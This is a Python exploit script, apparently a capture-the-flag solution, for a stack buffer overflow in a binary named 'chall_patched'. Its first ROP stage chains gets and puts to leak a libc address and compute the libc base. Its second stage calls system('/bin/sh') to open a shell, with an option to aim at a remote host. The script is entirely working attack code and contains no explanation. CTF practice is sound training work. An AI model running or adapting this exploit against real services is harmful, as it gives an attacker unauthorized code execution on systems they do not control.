#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'info'
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        b*main+170
        b*main+460
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def choice(option):

    sl(str(f'{option}'))

def stage1():

    pop_rbp = 0x40115d # pop rbp; ret;
    ret = 0x401016 
    
    payload = flat({
        offset: [
            exe.plt["gets"],
            exe.plt["gets"],
            exe.plt["puts"],
            exe.sym["main"]
        ]
    })

    choice(1)
    sla(b'name:\n', payload)
    choice(1)
    choice(2)

    sl(b"A" * 4 + b"\x00"*3)

    ru(b"AAAA\xff\xff\xff\xff")
    leak = u64(rl()[:-1].ljust(0x8, b'\0'))
    libc.address = leak + 0x28c0

    slog('Leak', leak)
    slog('Libc base', libc.address)

def stage2():

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

    payload = flat({

        offset: [
            pop_rdi,
            next(libc.search(b'/bin/sh\0')),
            pop_rdi + 1,
            libc.sym.system
        ]

    })

    choice(1)
    sla(b'name:\n', payload)
    choice(1)
    choice(2)

def exploit():

    global offset 

    offset = 72
    
    stage1()
    stage2()

    interactive()

if __name__ == '__main__':
  exploit()
